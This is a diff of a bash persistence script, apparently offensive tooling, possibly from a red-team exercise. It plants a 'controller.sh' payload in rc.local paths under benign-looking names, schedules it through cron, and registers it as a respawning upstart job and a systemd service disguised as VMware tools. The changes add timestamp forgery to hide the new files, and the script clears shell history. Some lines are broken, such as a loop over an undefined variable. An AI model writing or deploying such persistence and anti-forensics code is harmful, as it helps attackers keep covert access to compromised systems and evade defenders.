@@ -6,17 +6,20 @@ LOCATIONS=("/etc/rc.local"
            "/etc/init.d/rc.local"
            "/etc/systemd/system/basic.target/rc.local"
            "/etc/systemd/system/multi-user.target/rc.local")
-
+NAMES=("controller.sh" "networkd.sh" "scorecheck.sh" "loghelper.sh")
 for LOCATION in "${LOCATIONS[@]}"
 do
     if [ -f "$LOCATION" ]; then
-        cp -p "controller.sh" "${LOCATION%/*}/controller.sh" &> /dev/null
+        for SERVICE in "${SERVICES[@]}"
+        do
+            cp -p "controller.sh" "${LOCATION%/*}/$SERVICE" &> /dev/null
+        done
     fi
 done
 (crontab -l 2>/dev/null; echo "15 5 17 4 * /etc/rc.local/controller.sh") | crontab -
 cp -p "controller.sh" "/etc/init.d/rc.local/rcd.sh" &> /dev/null
 if [[ $(initctl version) =~ upstart 2> /dev/null]]; then
-    sudo touch /etc/init/network-monitor.conf
+    sudo touch -r /etc/init/rc-sysinit.conf -a /etc/init/rc-sysinit.conf -c /etc/init/rc-sysinit.conf /etc/init/network-monitor.conf
     sudo cat > /etc/init/network-monitor.conf << EOF
     description "Network Monitor"
     start on runlevel [2345]
@@ -25,9 +28,10 @@ if [[ $(initctl version) =~ upstart 2> /dev/null]]; then
     respawn limit unlimited
     exec /etc/init.d/rc.local/rcd.sh
 EOF
+    sudo touch -r /etc/init/rc-sysinit.conf -a /etc/init/rc-sysinit.conf -c /etc/init/rc-sysinit.conf /etc/init/network-monitor.conf
     start network-monitor
 elif [[ $(systemctl) 2> /dev/null]]; then
-    sudo touch /etc/systemd/system/vmwaretoolsd.service
+    sudo touch -r /etc/systemd/system/sudo.service -a /etc/systemd/system/sudo.service -c /etc/systemd/system/sudo.service /etc/systemd/system/vmwaretoolsd.service
     sudo cat > /etc/systemd/system/vmwaretoolsd.service << EOF
     [Unit]
     Description=Service for virtual machines hosted on VMWare
@@ -42,9 +46,11 @@ elif [[ $(systemctl) 2> /dev/null]]; then
     [Install]
     WantedBy=multi-user.target
 EOF
+    sudo touch -r /etc/systemd/system/sudo.service -a /etc/systemd/system/sudo.service -c /etc/systemd/system/sudo.service /etc/systemd/system/vmwaretoolsd.service
     systemctl daemon-reload
     systemctl start vmwaretoolsd.service
 fi
+
 #garbage
 history -c
 rm -f $HOME/.bash_history
